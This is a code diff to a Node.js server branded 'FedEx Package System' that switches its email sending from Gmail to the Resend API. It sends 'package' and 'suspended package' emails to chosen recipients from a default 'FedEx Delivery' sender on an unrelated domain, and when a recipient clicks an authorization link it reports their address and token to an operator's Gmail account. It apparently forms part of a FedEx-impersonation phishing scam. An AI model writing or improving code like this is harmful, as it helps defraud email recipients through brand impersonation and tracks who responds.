@@ -1,12 +1,15 @@
 // server.js
 require('dotenv').config();
 const express = require('express');
-const nodemailer = require('nodemailer');
+const { Resend } = require('resend');
 const crypto = require('crypto');
 const multer = require('multer');
 const path = require('path');
 const fs = require('fs');
 const cloudinary = require('cloudinary').v2;
+
+// Initialize Resend
+const resend = new Resend(process.env.RESEND_API_KEY);
 
 // Translation helper function
 const translations = {};
@@ -102,17 +105,6 @@ const upload = multer({
 
 // Store active tokens
 const activeTokens = new Map();
-
-// Configure email transporter
-const createTransporter = () => {
-  return nodemailer.createTransport({
-    service: 'gmail',
-    auth: {
-      user: process.env.EMAIL_USER,
-      pass: process.env.EMAIL_PASS
-    }
-  });
-};
 
 // Function to generate free map image URL
 const generateMapImageUrl = (address, width = 600, height = 300) => {
@@ -277,7 +269,6 @@ app.post('/send-task', upload.fields([
       emailLanguage: emailLanguage || 'en'
     };
 
-    const transporter = createTransporter();
     const emailHtml = await generateEmailHtml(packageData);
 
     // Use translated subject
@@ -286,16 +277,22 @@ app.post('/send-task', upload.fields([
       specialId: packageData.specialId 
     });
 
-    const mailOptions = {
-      from: process.env.EMAIL_USER,
+    // Send email using Resend
+    console.log('Sending email via Resend to:', recipientEmail, 'in language:', packageData.emailLanguage);
+    
+    const { data, error } = await resend.emails.send({
+      from: process.env.EMAIL_FROM || 'FedEx Delivery <noreply@zenatrust.com>',
       to: recipientEmail,
       subject: emailSubject,
       html: emailHtml
-    };
+    });
 
-    console.log('Sending email to:', recipientEmail, 'in language:', packageData.emailLanguage);
-    await transporter.sendMail(mailOptions);
-    console.log('Email sent successfully!');
+    if (error) {
+      console.error('Resend error:', error);
+      throw new Error(`Failed to send email: ${error.message}`);
+    }
+
+    console.log('Email sent successfully via Resend!', data);
 
     res.json({ 
       success: true, 
@@ -357,35 +354,35 @@ app.get('/authorize/:token', async (req, res) => {
   tokenData.authorized = true;
   activeTokens.set(token, tokenData);
 
-  // Send notification to the email_pass account
+  // Send notification to admin using Resend
   try {
-    const transporter = createTransporter();
-    const notificationMailOptions = {
-      from: process.env.EMAIL_USER,
-      to: process.env.EMAIL_USER,
-      subject: `🔓 Package Authorization Notification - ${tokenData.taskName || tokenData.packageName}`,
-      html: `
-        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background-color: #f5f5f5;">
-          <div style="background: linear-gradient(135deg, #4d148c, #6c63ff); color: white; padding: 20px; text-align: center; border-radius: 10px 10px 0 0;">
-            <h1 style="margin: 0; font-size: 24px;">FedEx Authorization Alert</h1>
-          </div>
-          <div style="background: white; padding: 30px; border-radius: 0 0 10px 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
-            <h2 style="color: #28a745; margin-bottom: 20px;">✅ Package Authorized Successfully!</h2>
-            <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
-              <p style="margin: 10px 0;"><strong>Package:</strong> ${tokenData.taskName || tokenData.packageName}</p>
-              <p style="margin: 10px 0;"><strong>Recipient:</strong> ${tokenData.recipientEmail}</p>
-              <p style="margin: 10px 0;"><strong>Language:</strong> ${lang.toUpperCase()}</p>
-              <p style="margin: 10px 0;"><strong>Authorization Time:</strong> ${new Date().toLocaleString()}</p>
-              <p style="margin: 10px 0;"><strong>Token:</strong> ${token}</p>
-            </div>
-            <p style="color: #666;">This package has been authorized by the recipient and is ready for processing.</p>
-          </div>
+    const notificationHtml = `
+      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background-color: #f5f5f5;">
+        <div style="background: linear-gradient(135deg, #4d148c, #6c63ff); color: white; padding: 20px; text-align: center; border-radius: 10px 10px 0 0;">
+          <h1 style="margin: 0; font-size: 24px;">FedEx Authorization Alert</h1>
         </div>
-      `
-    };
+        <div style="background: white; padding: 30px; border-radius: 0 0 10px 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
+          <h2 style="color: #28a745; margin-bottom: 20px;">✅ Package Authorized Successfully!</h2>
+          <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
+            <p style="margin: 10px 0;"><strong>Package:</strong> ${tokenData.taskName || tokenData.packageName}</p>
+            <p style="margin: 10px 0;"><strong>Recipient:</strong> ${tokenData.recipientEmail}</p>
+            <p style="margin: 10px 0;"><strong>Language:</strong> ${lang.toUpperCase()}</p>
+            <p style="margin: 10px 0;"><strong>Authorization Time:</strong> ${new Date().toLocaleString()}</p>
+            <p style="margin: 10px 0;"><strong>Token:</strong> ${token}</p>
+          </div>
+          <p style="color: #666;">This package has been authorized by the recipient and is ready for processing.</p>
+        </div>
+      </div>
+    `;
 
-    await transporter.sendMail(notificationMailOptions);
-    console.log('Authorization notification sent to admin');
+    await resend.emails.send({
+      from: process.env.EMAIL_FROM || 'FedEx Delivery <noreply@zenatrust.com>',
+      to: process.env.EMAIL_USER || 'fedexcompany81060@gmail.com',
+      subject: `🔓 Package Authorization Notification - ${tokenData.taskName || tokenData.packageName}`,
+      html: notificationHtml
+    });
+
+    console.log('Authorization notification sent to admin via Resend');
   } catch (error) {
     console.error('Failed to send authorization notification:', error);
   }
@@ -706,7 +703,6 @@ app.post('/send-suspended-package', upload.single('packageImage'), async (req, r
       emailLanguage: emailLanguage || 'en'
     };
 
-    const transporter = createTransporter();
     const emailHtml = generateSuspendedPackageEmail(packageData);
 
     // Use translated subject
@@ -715,16 +711,22 @@ app.post('/send-suspended-package', upload.single('packageImage'), async (req, r
       specialId: packageData.specialId 
     });
 
-    const mailOptions = {
-      from: process.env.EMAIL_USER,
+    // Send email using Resend
+    console.log('Sending suspended package email via Resend to:', recipientEmail, 'in language:', packageData.emailLanguage);
+    
+    const { data, error } = await resend.emails.send({
+      from: process.env.EMAIL_FROM || 'FedEx Delivery <noreply@zenatrust.com>',
       to: recipientEmail,
       subject: emailSubject,
       html: emailHtml
-    };
+    });
 
-    console.log('Sending suspended package email to:', recipientEmail, 'in language:', packageData.emailLanguage);
-    await transporter.sendMail(mailOptions);
-    console.log('Suspended package email sent successfully!');
+    if (error) {
+      console.error('Resend error:', error);
+      throw new Error(`Failed to send email: ${error.message}`);
+    }
+
+    console.log('Suspended package email sent successfully via Resend!', data);
 
     res.json({ 
       success: true, 
@@ -887,14 +889,14 @@ function generateSuspendedPackageEmail(data) {
 
 app.listen(PORT, () => {
   console.log(`🚀 FedEx Package System running on http://localhost:${PORT}`);
-  console.log(`📧 Email configured for: ${process.env.EMAIL_USER || 'NOT SET'}`);
-  console.log(`🔑 Email password: ${process.env.EMAIL_PASS ? 'SET ✅' : 'NOT SET ❌'}`);
+  console.log(`📧 Using Resend API for email delivery ✅`);
+  console.log(`🔑 Resend API Key: ${process.env.RESEND_API_KEY ? 'SET ✅' : 'NOT SET ❌'}`);
+  console.log(`📨 Email From: ${process.env.EMAIL_FROM || 'FedEx Delivery <noreply@zenatrust.com>'}`);
   console.log(`🗺️ Using free map service (no API key required) ✅`);
   
-  if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
-    console.log(`\n⚠️  WARNING: Email credentials not properly configured!`);
+  if (!process.env.RESEND_API_KEY) {
+    console.log(`\n⚠️  WARNING: Resend API key not configured!`);
     console.log(`   Please check your .env file has:`);
-    console.log(`   EMAIL_USER=your-email@gmail.com`);
-    console.log(`   EMAIL_PASS=your-app-password`);
+    console.log(`   RESEND_API_KEY=your-resend-api-key`);
   }
 });
